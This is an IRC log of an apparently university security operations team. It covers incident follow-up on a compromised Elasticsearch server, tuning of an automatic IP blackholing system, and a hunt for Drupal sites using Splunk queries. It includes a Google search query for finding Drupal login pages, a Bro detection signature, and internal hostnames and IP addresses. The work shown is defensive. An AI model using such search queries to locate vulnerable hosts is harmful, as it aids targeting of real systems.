2014-07-15 10:38:09	soehlert	have you sent an updated email to rob explaining that it was compromised?
2014-07-15 10:38:27	jazoff	no
2014-07-15 10:38:32	wardog	I am
2014-07-15 10:38:39	wardog	There's a ticket with replies.
2014-07-15 10:38:44	soehlert	ok good
2014-07-15 10:38:48	wardog	Although, it's not behaving nicely.
2014-07-15 10:40:20	soehlert	haha "Enjoy the shell"
2014-07-15 10:40:40	wardog	they said /tmp/bins didn't exist. I wonder if a different name was used.
2014-07-15 10:41:03	soehlert	were they using built in tools to verify it didn't exist?
2014-07-15 10:41:09	jazoff	no, that's what command was sent via ES
2014-07-15 10:41:13	jazoff	they may have deleted it
2014-07-15 10:42:59	wardog	ug... bro timestamps... Maybe have bro-cut or something in a script folder under the incidents repo
2014-07-15 10:43:24	jazoff	oh.. should have converted them before I added them
2014-07-15 10:43:55	wardog	It's fine to leave them in. If it's not converted everytime it would be nice to have the script available just in case.
2014-07-15 10:50:38	wardog	is it me or does it smell like rust in NCSA right now.
2014-07-15 10:51:10	soehlert	i smell something
2014-07-15 11:09:22	wardog	Smells like a day old fish market
2014-07-15 11:30:29	wardog	That pack.pl script is interesting. If only (re: time machine). Looks like it's regular unencrypted tcp.
2014-07-15 11:32:46	jazoff	yep
2014-07-15 11:47:57	jazoff	eyrich: you see the new arista switches?
2014-07-15 11:48:03	jazoff	eyrich: 1U switch with 100g uplinks
2014-07-15 12:45:39	eyrich	jazoff: i had not
2014-07-15 12:54:47	eyrich	jazoff: are you home?
2014-07-15 12:54:49	eyrich	or at xsede?
2014-07-15 13:00:41	jazoff	home
2014-07-15 13:01:31	jazoff	adam mentioned something about me going to the security meeting which appears to be on thursday
2014-07-15 13:05:47	eyrich	I would like to discuss enhancments to BHR system, got time for a call
2014-07-15 13:05:49	eyrich	?
2014-07-15 13:07:34	jazoff	sure
2014-07-15 13:08:16	eyrich	no answer on lync
2014-07-15 13:08:39	jazoff	yeah.. it made the sound, but I didn't see popupt
2014-07-15 13:08:43	jazoff	stupid lync
2014-07-15 16:20:30	soehlert	jazoff: how do we get the puppet git stuff going on the new puppet master?
2014-07-15 16:20:39	soehlert	just copy the scripts and add to the crontab?
2014-07-15 17:09:52	jazoff	they are in puppet
2014-07-15 17:10:13	jazoff	at least the autopull thing that I wrote is
2014-07-15 17:13:37	soehlert	welll i don't want to/cant puppetize the new puppet master do i?
2014-07-15 17:17:21	jazoff	sure you can.. the old one was in puppet
2014-07-15 17:24:24	soehlert	ah ok
2014-07-16 07:33:37	jazoff	ran a scan and found another elastic search server
2014-07-16 07:33:39	jazoff	141.142.227.66:9200
2014-07-16 07:33:50	jazoff	cleverly named elasticsearch.ncsa.illinois.edu
2014-07-16 07:34:02	jazoff	looks like it is limited to 141.142, but that really isn't ok either
2014-07-16 09:23:59	wardog	sam, vetting ticket: https://help.ncsa.illinois.edu/Ticket/Display.html?id=3790
2014-07-16 10:26:04	eyrich	jazoff: bhr adaptavie those numbers look good to me, your thoughts?
2014-07-16 10:26:32	eyrich	and I think we will be looking at a requested block of 5 minutes
2014-07-16 10:28:27	jazoff	hmm
2014-07-16 10:28:39	jazoff	that might need some tweaking, i think with a defualt of 5 minutes it will never adapt
2014-07-16 10:28:58	jazoff	might need to set a minimum on the repeat offender interval to 1 day or something like that
2014-07-16 10:29:57	eyrich	it will if we ramp up the factors
2014-07-16 10:30:35	jazoff	i see
2014-07-16 10:30:49	eyrich	we have a large enough IP space that scanners will possible end up with day and week blocks real quick before they are through the space
2014-07-16 10:31:10	jazoff	yeah.. if they continue scanning
2014-07-16 10:31:24	jazoff	i was thinking more like someone scans for 5 minutes, then stops for 20, then scans for 5 minutes...
2014-07-16 10:31:47	eyrich	does that happen much?
2014-07-16 10:31:57	jazoff	i dunno :)
2014-07-16 10:32:28	eyrich	the cool thing about low request times is that false positives get cleaned up quickly
2014-07-16 10:32:37	jazoff	yeah
2014-07-16 10:33:46	jazoff	so it shouldn't be too hard to port that code to perl and hook it up to the DB
2014-07-16 10:34:58	eyrich	ya - lest doooo it
2014-07-16 10:35:00	eyrich	lets
2014-07-16 10:38:34	jazoff	blackhole=> select block_ipaddress,count(block_ipaddress) from blocklog group by block_ipaddress order by count desc limit 10;
2014-07-16 10:38:38	jazoff	 block_ipaddress | count
2014-07-16 10:38:40	jazoff	-----------------+-------
2014-07-16 10:38:43	jazoff	 129.9.27.160    |     8
2014-07-16 10:38:45	jazoff	 209.174.172.252 |     8
2014-07-16 10:38:48	jazoff	 61.174.51.218   |     8
2014-07-16 10:39:01	eyrich	209.174.172.252 is a test address
2014-07-16 10:39:25	jazoff	 bc | count
2014-07-16 10:39:26	jazoff	----+--------
2014-07-16 10:39:26	jazoff	  1 | 326005
2014-07-16 10:39:26	jazoff	  2 |  22776
2014-07-16 10:39:26	jazoff	  3 |   6866
2014-07-16 10:39:26	jazoff	  4 |   1648
2014-07-16 10:39:29	jazoff	  5 |    442
2014-07-16 10:39:31	jazoff	  6 |     95
2014-07-16 10:39:34	jazoff	  7 |     45
2014-07-16 10:39:36	jazoff	  8 |      5
2014-07-16 10:39:39	jazoff	bc = block count
2014-07-16 10:41:58	eyrich	not a great number of repeate offenders when you have 30 day blocks and less then 1 year of history
2014-07-16 10:42:34	eyrich	but by changing to 5 minute block i expect that to change 
2014-07-16 10:43:46	jazoff	:)
2014-07-16 10:43:59	jazoff	but at least a non zero number of repeat offenders even at 30 days
2014-07-16 10:44:11	jazoff	about 10%
2014-07-16 10:45:58	eyrich	wardog: are we having a meeting today, can we move it to now?
2014-07-16 10:49:37	wardog	Someone put an 11am on my calendar.
2014-07-16 10:49:41	wardog	Otherwise, yes.
2014-07-16 10:49:59	eyrich	so yes now - we have 10 minutes or no
2014-07-16 10:50:22	wardog	k
2014-07-16 10:51:04	wardog	jazoff: what are you working on? And what was the last status of the Duo API interface?
2014-07-16 10:52:16	jazoff	bhr stuff lately, before that, elastic search scanning and incident handling
2014-07-16 10:53:48	jazoff	which reminds me, should probably poke the people running elasticsearch.ncsa.illinois.edu
2014-07-16 11:02:10	wardog	jazoff: I'll take care of it.
2014-07-16 11:15:54	wardog	soehlert: 4 subscriptions are now available.
2014-07-16 11:16:10	soehlert	k thanks
2014-07-16 11:54:49	soehlert	the fuck?! puppet now requires root ssh access from the master to all the clients for install?!
2014-07-16 11:56:10	jazoff	sounds like some auto feature that might be optional?
2014-07-16 11:57:10	soehlert	nope was not optional. but i realized i can at least use the secops user 
2014-07-16 12:00:37	jazoff	can you figure out what it is doing and just do it yourself?
2014-07-16 12:01:34	soehlert	im presuming theyre trying to make client installs easier, but im trying to figure that part out. i need to supply the master with the info in order to install it
2014-07-16 12:10:59	soehlert	and of course they don't have the release notes up for this one yet..
2014-07-16 13:32:58	jazoff	eyrich: ok, I think i have implemented the auto scaling
2014-07-16 13:33:03	jazoff	haven't deployed yet though
2014-07-16 13:33:41	soehlert	eyrich's gone for the day
2014-07-16 13:33:44	soehlert	err week
2014-07-16 13:34:18	jazoff	ah
2014-07-16 13:34:34	jazoff	seems to work though,need more testing though
2014-07-16 13:34:35	jazoff	[vagrant@localhost vagrant]$ BHR_CFG=bhr.cfg perl bhcore.pl  add justin 4.4.4.2 bad 10 1
2014-07-16 13:34:37	jazoff	Scale this duration of 10 based on a last duration of 41 from 30.792083 ago
2014-07-16 13:34:40	jazoff	Scaled result = 82
2014-07-16 13:47:51	jazoff	i need to run some more tests anyway, we can shoot for deploying next week
2014-07-16 15:59:51	wardog	Any chance we can pull the total amount of blocks we've placed from July 2013 to June 2014?
2014-07-16 16:00:52	wardog	Nix that. What were they in the last quarter?
2014-07-16 16:00:58	wardog	April - June
2014-07-16 16:01:44	wardog	Unique and Total
2014-07-16 16:02:12	wardog	The log rate issue actually makes that hard, doesn't it.
2014-07-16 16:11:53	jazoff	i can grab it from the sql db
2014-07-16 16:12:51	jazoff	oh, the sql db only goes back to 1/28
2014-07-16 16:13:05	jazoff	oh, last quarder is easy :)
2014-07-16 16:14:48	jazoff	blackhole=> select count(1) as total, count(distinct(block_ipaddress)) as unique_ips from blocklog where block_when between '2014-04-01'  and '2014-07-01';
2014-07-16 16:14:52	jazoff	-[ RECORD 1 ]------
2014-07-16 16:14:54	jazoff	total      | 153115
2014-07-16 16:14:57	jazoff	unique_ips | 144170
2014-07-17 12:23:23	keist	anyone know how I can create a JIRA ticket to assign to clindsey? His name isn't available in the drop down box under assignee and not sure what to put for the project, I'm thinking Security Operations. It's for the password group which meets fortnightly
2014-07-17 12:54:22	wardog	You should go through RT
2014-07-17 12:54:23	wardog	Not JIRA
2014-07-17 12:54:47	wardog	Or just email your request to help@ncsa.illinois.edu and at the top tell them to assign it to lindsey
2014-07-17 12:56:48	keist	wardog: kk thanks
2014-07-17 12:57:24	keist	what's the URL for RT?
2014-07-17 12:57:38	soehlert	https://help.ncsa.illinois.edu
2014-07-17 12:57:44	soehlert	must do the https and NOT http
2014-07-17 13:00:55	keist	thx
2014-07-17 14:38:19	wardog	So, I have the ldap query for the BW user lookup. Thoughts on where to run that from since it doesn't need to be on the bastions or in the 10.5?
2014-07-17 14:38:35	wardog	cyclone? Just as a script that splunk runs.
2014-07-17 14:38:36	wardog	?
2014-07-17 15:09:15	soehlert	works for me.
2014-07-17 15:15:36	wardog	well, ldapsearch isn't on cyclops.
2014-07-17 15:15:47	wardog	Could probably do it through python.
2014-07-17 15:16:07	soehlert	python ldaphelper?
2014-07-17 15:16:47	wardog	whatever will let me do an ldap lookup
2014-07-17 15:17:14	soehlert	may need to wait until that has been centos'ized..
2014-07-17 15:53:49	wardog	jazoff: can you automate that sql query every quarter? The one for number of blocks by BHR?
2014-07-17 15:54:23	soehlert	i think jazoff actually worked to a normal east coast time today for once
2014-07-17 15:58:56	wardog	Oh. jazoff is over at XSEDE right now, isn't he?
2014-07-17 16:03:54	soehlert	ahhh maybe thats it
2014-07-17 16:04:47	wardog	Yep, adam just confirmed
2014-07-17 16:09:30	wardog	And, best part is, no call in number. :)
2014-07-17 16:09:39	wardog	Guess I can't call in. oh well.
2014-07-17 16:09:41	soehlert	oooo well
2014-07-17 16:17:26	jazoff	yes
2014-07-17 16:17:50	jazoff	sure, I can automate via a cron job i guess
2014-07-18 11:47:44	jazoff	keist: did something change witht he cif server?
2014-07-18 11:47:59	jazoff	getting 403 errors accessing it from info
2014-07-18 11:49:23	jazoff	httpd logs seem to indicate it is running the request but then sending the 403
2014-07-18 11:49:48	jazoff	hmm
2014-07-18 11:59:58	jazoff	not sure what is up with it
2014-07-18 13:54:40	keist	ah, not sure, I'll check on it in a moment
2014-07-18 13:54:58	keist	err, I mean I haven't changed anything on it
2014-07-18 14:03:06	jazoff	yeah, it's odd
2014-07-18 14:03:31	jazoff	not sure how long it hasn't worked for though
2014-07-21 08:20:21	jazoff	mr up
2014-07-21 08:20:24	jazoff	oops
2014-07-21 08:40:31	soehlert	ive got an appointment this morning. i'll be in afterwards
2014-07-21 13:01:58	eyrich	jazoff: what is the status of the new BHR auto stuff?
2014-07-21 13:03:39	eyrich	gotta go pickup dog at vet med, staying home with her after that
2014-07-21 13:07:01	jazoff	eyrich: should be ready to go
2014-07-21 13:07:11	jazoff	did some testing last week, seems to do what we discussed
2014-07-21 13:07:26	jazoff	i can think of some areas to improve it but they complicate things
2014-07-21 13:07:46	jazoff	like, if we block an ip for scanning and it is in CIF should it have a larger default?
2014-07-21 13:07:56	jazoff	I suppose I can handle that on the bro side actually
2014-07-21 14:00:34	eyrich	i think it would better on the bro side and let BHR just be the instrament, and not rely on info from outside of BHR
2014-07-21 14:00:56	jazoff	yeah, I can do the lookup in bro and pre-scale the initial time
2014-07-21 14:01:07	eyrich	right
2014-07-21 14:04:23	eyrich	anyone have anything for the xsede call?
2014-07-21 14:04:31	eyrich	irst call
2014-07-21 14:07:08	eyrich	caltech seeing sutra infections used to install proxy servers, used for lots of porn and some library collection access
2014-07-21 14:26:46	eyrich	Sutra info: http://www.symantec.com/connect/blogs/web-based-malware-distribution-channels-look-traffic-redistribution-systems
2014-07-21 15:26:46	soehlert	jazoff: in other news, splunk should be able to tell me everyone who runs drupal here right?
2014-07-21 15:27:40	jazoff	possibly. i think bro may detect that as a software
2014-07-21 15:27:57	soehlert	thats what i was presuming
2014-07-21 15:28:25	jazoff	source=*software* drupal
2014-07-21 15:28:35	jazoff	http://isda.ncsa.illinois.edu/drupal/
2014-07-21 15:28:38	jazoff	you can tell they are hiding
2014-07-21 15:28:57	soehlert	they are hiding?
2014-07-21 15:29:02	jazoff	sarcasm
2014-07-21 15:29:05	jazoff	the url is /drupal
2014-07-21 15:29:41	soehlert	ah sarcasm meter broken as i noticed the url thing already.
2014-07-21 15:30:40	soehlert	how do i make it only show me one entry per host?
2014-07-21 15:32:24	jazoff	| dedup
2014-07-21 15:32:34	soehlert	too difficult..
2014-07-21 15:32:46	jazoff	or just source=*software* drupal  | top url
2014-07-21 15:32:57	soehlert	actually dedup is expecting an argument it would seem
2014-07-21 15:32:58	jazoff	which narrows it down to 4 but they are all that same host
2014-07-21 15:33:02	jazoff	yeah
2014-07-21 15:33:13	soehlert	would that be dedup source_ip or something?
2014-07-21 15:33:20	jazoff	yeah, whatever you want to dedup on
2014-07-21 15:33:39	soehlert	oh ok so literlally the only host splunk has seen doing drupal is this one?
2014-07-21 15:33:47	soehlert	i searched on all time. that just seems too low a number
2014-07-21 15:33:52	jazoff	well, bro
2014-07-21 15:34:10	soehlert	well ya.
2014-07-21 15:34:24	jazoff	might be worthwhile to pull down every known internal hostname and look for drupal in the page header
2014-07-21 15:34:29	jazoff	or just ask google, that works too
2014-07-21 15:34:31	soehlert	how confident can we be that's the only instance running here? I guess a scan would be a good idea
2014-07-21 15:34:45	soehlert	well google might not crawl everything here theoretically
2014-07-21 15:35:14	jazoff	intitle:"User account" inurl:"user/login" site:ncsa.illinois.edu
2014-07-21 15:35:18	jazoff	according to a blog post I found
2014-07-21 15:35:21	jazoff	finds the same host
2014-07-21 15:35:40	jazoff	a lot of  worms use google to find hosts to infect
2014-07-21 15:35:50	soehlert	ya i know that will work, just want to be sure we see it all. major drupal bug according to randy. 
2014-07-21 15:36:06	jazoff	yeah
2014-07-21 15:42:37	jazoff	drupal is not as popular as wordpress so on a first glace I think we are ok
2014-07-21 15:42:44	soehlert	ya thats true
2014-07-21 15:42:49	soehlert	we do have lots of WP
2014-07-21 15:42:58	jazoff	bro and google both only return the one host
2014-07-21 15:44:38	soehlert	i'll see if i can kick off an nmap scan or something just to cover our bases.
2014-07-21 15:45:08	jazoff	well if it is http bro would have seen it
2014-07-21 15:45:14	jazoff	only thing I think it would have missed was ssl
2014-07-21 15:45:20	jazoff	and you can get a list of ssl sites from bro and wget each one
2014-07-21 15:45:52	jazoff	ah, found http://snuffy.ncsa.illinois.edu/drupal/ but that is the same site
2014-07-21 15:45:54	soehlert	i agree. i just dont want randy coming back asking why we only checked there. i fully expect to see nothing more, just a little CYA
2014-07-21 15:47:38	jazoff	did blizzard.ncsa.illinois.edu used to run drupal?
2014-07-21 15:48:03	jazoff	oh, nm, these are people scanning for drupal
2014-07-21 15:48:18	soehlert	wait blizzard is scanning for drupal?
2014-07-21 15:48:30	jazoff	other way around
2014-07-21 15:50:05	soehlert	ah ok. way less concerned about your way than mine
2014-07-21 15:50:22	jazoff	http://141.142.240.33/Drupal/
2014-07-21 15:50:42	soehlert	capital D throwing us off..
2014-07-21 15:50:54	jazoff	i searched for source=*http_inbound* drupal uri=*drupal* status_code!=404 | top limit=10000  id_resp_h, addr
2014-07-21 15:52:36	jazoff	source=*http_inbound* drupal uri=*drupal* status_code!=4* | top limit=10000  id_resp_h, addr
2014-07-21 15:52:39	jazoff	better
2014-07-21 15:52:56	soehlert	lot of 403s?
2014-07-21 15:54:16	jazoff	yeah
2014-07-21 15:54:39	soehlert	oh man this search is popping up a lot more hosts, though the count is tiny on most of them
2014-07-21 15:55:12	jazoff	yeah, most are false positives
2014-07-21 15:55:16	jazoff	oh, qualys
2014-07-21 15:55:16	soehlert	must just be scans
2014-07-21 15:55:16	soehlert	i see polot on there and that doesn't run drupal
2014-07-21 15:55:41	jazoff	source=*http_inbound* drupal uri=*drupal* status_code!=4* NOT id_orig_h=64.39.0.0/16 | top limit=10000  id_resp_h, addr
2014-07-21 15:56:14	soehlert	probably should have assumed qualys was to blame for many of these
2014-07-21 15:57:19	soehlert	so the top three are blog.ncsa.uiuc.edu, isda.ncsa.illinois.edu, isda.ncsa.uiuc.edu. all pointing to the same thing
2014-07-21 15:57:35	soehlert	spice.ncsa.uiuc.edu is the only other positive it would seem
2014-07-21 15:57:38	jazoff	oh, this DID find the other one too
2014-07-21 15:57:39	jazoff	source=*software* drupal | top src
2014-07-21 15:58:23	jazoff	not sure why it thought 227.144 was drupal though
2014-07-21 16:01:17	soehlert	i see a count of 5 for that host in the last month. probably a false positive. 
2014-07-21 16:01:27	soehlert	not sure how bro reads that wrong though
2014-07-21 16:03:08	jazoff	could be someone poking at it for drupal and it echoing like "no drupal here" and confusing it
2014-07-21 16:04:59	soehlert	ya i guess i never looked into how bro decides if the software exists there or not
2014-07-21 16:09:18	jazoff	signature webapp-drupal {
2014-07-21 16:09:18	jazoff		http-reply-body /.*(<script [^>]+drupal\.js|jQuery\.extend\(Drupal\.settings, \{|Drupal\.extend\(\{ settings: \{|<link[^>]+sites\/(default|all)\/themes\/|<style[^>]+sites\/(default|all)\/(themes|modules)\/)/
2014-07-21 16:09:23	jazoff		event "Drupal"
2014-07-21 16:09:26	jazoff	apparnetl
2014-07-21 16:09:28	jazoff	apparently
2014-07-21 16:09:49	soehlert	interesting
2014-07-21 16:12:05	jazoff	ah, this helps too
2014-07-21 16:12:05	jazoff	source=*http_outbound* drupal addr="updates.drupal.org"
2014-07-21 16:12:15	jazoff	same two ips
2014-07-21 16:12:23	soehlert	ahh cool
2014-07-21 16:12:34	soehlert	seems like we can be pretty confident with all this then. just those two sites
2014-07-21 16:28:36	jazoff	so.. i think puppet is probably broken on most of the hosts now
2014-07-21 16:28:48	jazoff	i didn't realise you changed that thing in the site.pp rather than remove server entirely
2014-07-21 16:29:03	jazoff	so now the older hosts are likely trying to grab files from puppet-sec and failing since they dont have the ca cert
2014-07-21 16:29:20	soehlert	well they were all unable to make any puppet runs from squall anyways
2014-07-21 16:29:24	soehlert	thats why i didnt much care
2014-07-21 16:29:35	jazoff	oh, good point
2014-07-22 12:17:06	eyrich	did anyone answer bouvet about logs being sent from 10.5 addresses?
2014-07-22 12:17:22	eyrich	he should also be corrected about it not being rain anymore
2014-07-22 12:17:30	jazoff	not I, I thought that was a pfsense question
2014-07-22 12:19:18	soehlert	ditto
2014-07-22 12:23:55	eyrich	pfsense allows logs from anywhere
2014-07-22 12:24:14	eyrich	so can someone confirm regearding the syslog config and the host firewalls?
2014-07-22 12:24:30	eyrich	bouvet has not "Noted" our lack of repsonse in this ticket
2014-07-22 12:24:32	eyrich	his tick4et
2014-07-22 12:24:45	eyrich	now noted out lack of response in the BW change control ticket
2014-07-22 12:24:54	eyrich	damn I can not type today
2014-07-22 12:26:23	soehlert	well that would be the load balancer that would be the fw right?
2014-07-22 12:27:42	soehlert	oh nvm i didnt realize keist put in restricting rules on the relays..
2014-07-22 12:28:03	eyrich	yes - so still need to confirm with the host fw and maybe syslog config - i dont know so want to make sure before i answer
2014-07-22 12:29:24	soehlert	well i was talking about the host fw
2014-07-22 12:31:11	soehlert	but i'll work on that this afternoon, gonna require some puppet changes and the relays arent using the correct puppet master as of yet.
2014-07-22 12:32:09	eyrich	they are restricted at this time?
2014-07-23 08:49:37	jazoff	eyrich: did you want to get the new bhr stuff going this week?
2014-07-23 08:50:18	eyrich	sure
2014-07-23 08:50:37	eyrich	lets give it a go and see what happens
2014-07-23 08:51:15	jazoff	ok. easy enough to revert
2014-07-23 08:52:38	jazoff	ok, perl updated
2014-07-23 08:52:47	jazoff	should work the same until I add the '1' to the end of the block command
2014-07-23 08:53:32	eyrich	right, and I would like to reduce the block request from bro to 15min
2014-07-23 08:53:41	jazoff	yeah, that too
2014-07-23 08:53:59	jazoff	going to change the log too to make it easier
2014-07-23 08:54:09	jazoff	right now it has UNTIL= but not the actual duration
2014-07-23 08:55:36	jazoff	ok, now it has
2014-07-23 08:55:37	jazoff	Jul 23 08:55:27 cygnus BHR_BLOCK: IP=187.20.240.169 HOSTNAME=bb14f0a9.virtua.com.br WHO=bro WHY="Scan::Address_Scan: 187.20.240.169 scanned at least 37 unique hosts on port 23/tcp in 0m14s" UNTIL=1408715727 DURATION=2592000
2014-07-23 08:55:43	jazoff	which will make seeing if the duration scaling is working
2014-07-23 08:59:09	jazoff	ok, done
2014-07-23 08:59:10	jazoff	Jul 23 08:59:00 cygnus BHR_BLOCK: IP=201.252.201.168 HOSTNAME=host168.201-252-201.telecom.net.ar WHO=bro WHY="Scan::Address_Scan: 201.252.201.168 scanned at least 37 unique hosts on port 443/tcp in 0m11s" UNTIL=1406124840 DURATION=900
2014-07-23 09:00:09	jazoff	so now we see what happens in 15 minutes
2014-07-23 09:27:11	eyrich	cool
2014-07-23 09:43:44	jazoff	no repeats yet
2014-07-23 12:04:12	jazoff	plenty of things blocked, no dupes yet though. annoying.
2014-07-23 14:14:07	jazoff	meeting?
2014-07-23 14:17:38	soehlert	dont think so
2014-07-23 14:17:43	soehlert	i mean i dont see the need at the moment
2014-07-23 15:02:12	eyrich	strange 0 blocks from 1-2pm
2014-07-23 15:02:25	eyrich	only 1 from noon-1
2014-07-23 15:07:43	jazoff	yeah, it was broked
2014-07-23 15:07:52	jazoff	and the nagios alert even worked but I didn't notice it
2014-07-23 15:08:17	jazoff	it failed the first time it got up to a repeat block beacuse I didn't realize the deploy.sh I ran didn'tupdate teh cfg options for the multipliers
2014-07-23 15:08:22	jazoff	so I just had to add in the 4 new lines
2014-07-23 15:08:36	jazoff	but they all queued :)
2014-07-23 15:08:46	jazoff	granted queuing for an hour for a 10 minute block is kinda silly :)
2014-07-23 15:13:49	jazoff	keist: what's the easiest way to make nagios text me the BHR queue alert?
2014-07-23 15:14:28	keist	for the service definition add a line like "contacts      jazoff-sms"
2014-07-23 15:14:52	keist	should be able to do exactly that I think
2014-07-23 16:16:01	jazoff	Jul 23 14:16:06 cygnus BHR_BLOCK: IP=50.23.131.222 HOSTNAME=50.23.131.222-static.reverse.softlayer.com WHO=bro WHY="Scan::Address_Scan: 50.23.131.222 scanned at least 37 unique hosts on port 80/tcp in 4m49s" UNTIL=1406143866 DURATION=900
2014-07-23 16:16:05	jazoff	Jul 23 15:18:23 cygnus BHR_BLOCK: IP=50.23.131.222 HOSTNAME=50.23.131.222-static.reverse.softlayer.com WHO=bro WHY="Scan::Address_Scan: 50.23.131.222 scanned at least 37 unique hosts on port 80/tcp in 4m58s" UNTIL=1406147840 DURATION=1137
2014-07-23 16:16:09	jazoff	eyrich: worked
2014-07-23 16:30:56	jazoff	Jul 23 16:18:45 cygnus BHR_BLOCK: IP=50.23.131.222 HOSTNAME=50.23.131.222-static.reverse.softlayer.com WHO=bro WHY="Scan::Address_Scan: 50.23.131.222 scanned at least 37 unique hosts on port 80/tcp in 4m56s" UNTIL=1406152923 DURATION=2598
2014-07-24 07:26:34	eyrich	jazoff: whats with the strange durations, shouldnt it be multiples of 900?
2014-07-24 07:26:51	jazoff	in theory yes...
2014-07-24 07:26:56	jazoff	they are multiples of the last block time
2014-07-24 07:27:11	jazoff	but the db doesn't actually store the block time once something is unblocked
2014-07-24 07:27:21	jazoff	and since the unblocker runs from cron every 5 minutes it gets rounded up
2014-07-24 07:27:28	eyrich	ok - right
2014-07-24 07:27:35	eyrich	i forgot that we had to calculate that
2014-07-24 07:28:01	jazoff	yeah.. in practice it should be close enough unless something breaks and the cronjob isn't running
2014-07-24 07:54:03	jazoff	that 50.23.131.222 ip went 900 1137 2598 5554 11486 23394 47172
2014-07-24 07:55:46	jazoff	195.39.196.50 is up to 23926
2014-07-24 08:01:32	eyrich	nice
2014-07-24 08:01:35	eyrich	very cool
2014-07-24 08:02:28	jazoff	may want to bump up the default time to an hour or tweak some of the multipliers
2014-07-24 08:02:32	jazoff	but otherwise working well
2014-07-24 08:02:40	eyrich	I think we bump up the multipliers
2014-07-24 08:03:15	jazoff	so right now there is 
2014-07-24 08:03:16	jazoff	time_multiplier:2.0
2014-07-24 08:03:16	jazoff	penalty_time_multiplier:2.0
2014-07-24 08:03:16	jazoff	return_to_base_multiplier:2.0
2014-07-24 08:03:16	eyrich	that way we still get low block time for "falst positives" and no repeaters
2014-07-24 08:03:16	jazoff	return_to_base_factor:2.0
2014-07-24 08:03:45	jazoff	https://github.com/JustinAzoff/singularity/blob/master/bhrmgr.pm#L42
2014-07-24 08:03:46	eyrich	We need to rename time_multiplier
2014-07-24 08:04:13	eyrich	now that we have 3 other ones
2014-07-24 08:06:36	eyrich	something about look back window mulripier or something
2014-07-24 08:08:18	jazoff	come up with a name :)
2014-07-24 08:08:59	eyrich	time_window_factor
2014-07-24 08:10:19	eyrich	does the code make sure we never block less then the requested time?
2014-07-24 08:10:25	jazoff	yes
2014-07-24 08:10:30	jazoff	er
2014-07-24 08:10:30	jazoff	stupid irssi
2014-07-24 08:10:35	jazoff	return max($seconds, $duration/$return_to_base_factor);
2014-07-24 08:10:49	jazoff	seconds = requested time
2014-07-24 08:10:57	eyrich	i see it, thanks
2014-07-24 08:11:00	jazoff	oh, wellll
2014-07-24 08:11:11	jazoff	it can actually...
2014-07-24 08:11:22	jazoff	if you block something for say an hour
2014-07-24 08:11:24	eyrich	ya - should each of the returns check that
2014-07-24 08:11:30	jazoff	then change the block time to 1 day
2014-07-24 08:11:38	jazoff	it will block a repeat offender for 2 hours
2014-07-24 08:11:56	jazoff	yeah, I just need to do it inside add_block
2014-07-24 08:12:19	eyrich	that makes sense
2014-07-24 08:16:31	jazoff	ok, updated
2014-07-24 08:16:38	jazoff	https://github.com/JustinAzoff/singularity/blob/master/bhrmgr.pm#L42
2014-07-24 08:19:45	eyrich	awesome, lets increase time window to 3 and penalty factor to 4
2014-07-24 08:20:17	jazoff	ok
2014-07-24 08:20:46	jazoff	done
2014-07-24 08:22:44	eyrich	cool
2014-07-24 10:24:50	jazoff	heh, repeat offenders that were previously blocked for a month are now getting blocked for 4 months :)
2014-07-24 10:44:29	eyrich	i like
2014-07-24 11:48:08	eyrich	heading to lunch and then to pcf to work on qualys appliances
2014-07-25 09:44:18	jazoff	eyrich: hmm, some hosts are scanning us every few hours and getting blocked for 15 minutes each time
2014-07-25 09:50:26	eyrich	ok, let increase look back window to 8
2014-07-25 09:51:58	eyrich	maybe also make bro more sensative again now that we are blocking for less time initally
2014-07-25 09:52:01	eyrich	talking with a sysadmin abotu blocked stuff was asking why a host wasnt getting blocked that was hitting his server, it was an 
2014-07-25 09:52:22	eyrich	they were UDP 123 packets
2014-07-25 09:52:57	eyrich	i know its problematic to have bro detect and block udp
2014-07-25 09:53:30	eyrich	what about letting the host systems tell us (via syslog maybe?) that a remote host is hostile and then we bhr it
2014-07-25 09:53:39	jazoff	don't see why not
2014-07-25 09:53:53	jazoff	also problem with udp is that the null routes don't block inbound due to no URPF
2014-07-25 09:55:21	eyrich	i thought neteng had urpf workign again
2014-07-25 09:55:39	jazoff	oh? had not heard anything
2014-07-25 09:55:48	eyrich	i guess we would need to test
2014-07-25 09:56:16	eyrich	i thought they upgrqaded to a newer version of junos on the exits that made it work 
2014-07-25 09:56:48	jazoff	testing is easy enough
2014-07-25 10:01:28	eyrich	regarding block requests via syslog I think we would need ot have soem way of authorizing the host to request a block. white list by IP to start maybe?
2014-07-25 10:02:14	jazoff	hmm
2014-07-25 10:02:19	jazoff	don't we kind of do that already with ossec?
2014-07-25 10:03:17	eyrich	well ossec parses syslogs, and does actions based on rules. so I guess an ossec rule would do it, but still needs a way to vet the requester, we dont want any host being able to doit
2014-07-25 10:05:29	jazoff	i mean, bro can do udp scan detection too....
2014-07-25 10:06:17	eyrich	seperate from the UDP discussion, i think the host request block thing might still be a good feature
2014-07-25 10:06:36	eyrich	i thought there were good reasons to not enable udp scan detection on bro
2014-07-25 10:06:51	jazoff	yeah, for the same reason you wouldn;t want to auto block based on a hosts logs
2014-07-25 10:07:10	jazoff	udp is spoofed a lot, especially when dealing with ntp reflection attacks
2014-07-25 10:07:33	eyrich	right - forgot about the spoofing
2014-07-25 10:38:01	jazoff	ok, that last change helped
2014-07-25 10:38:12	jazoff	further apart offenders are getting reblocked for 4x
2014-07-25 14:29:31	jazoff	quiet day? :)
2014-07-25 15:46:29	keist	yeah, no one is here 
2014-07-25 15:46:55	keist	except me atm
2014-07-28 12:08:03	wardog	jazoff: soehlert: VSLs
2014-07-28 12:08:09	jazoff	gah
2014-07-28 12:08:31	jazoff	do they not email ME about doing those?
2014-07-28 12:08:43	jazoff	seems odd that you get the notice but I don't get a reminder
2014-07-28 12:08:44	wardog	You should get an email
2014-07-28 12:08:55	wardog	Actually. I don't get a reminder about mine.
2014-07-28 12:08:56	wardog	odd
2014-07-28 12:08:58	wardog	So, I gues snot
2014-07-28 12:09:11	jazoff	yeah, I get a reminder about the other time thing
2014-07-28 12:10:14	jazoff	this month was easy at least :)
2014-07-28 13:24:22	wardog	Weird. In all my time here, this month was the first one I got a phone bill for. Thankfully all work related, but weird.
2014-07-28 13:25:21	jazoff	i still get email about mine.. need to remember to pay it next month
2014-07-28 13:25:28	jazoff	it's for like 16 cents
2014-07-28 13:28:26	wardog	When you were trying to find your phone, rigt?
2014-07-28 13:31:02	jazoff	yeah :)
2014-07-28 13:31:16	jazoff	basically rang long enough for voicemail to answer
2014-07-28 13:50:22	wardog	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/81.177.22.106
2014-07-28 13:50:39	wardog	This doesn't look like it's currently blackholed.
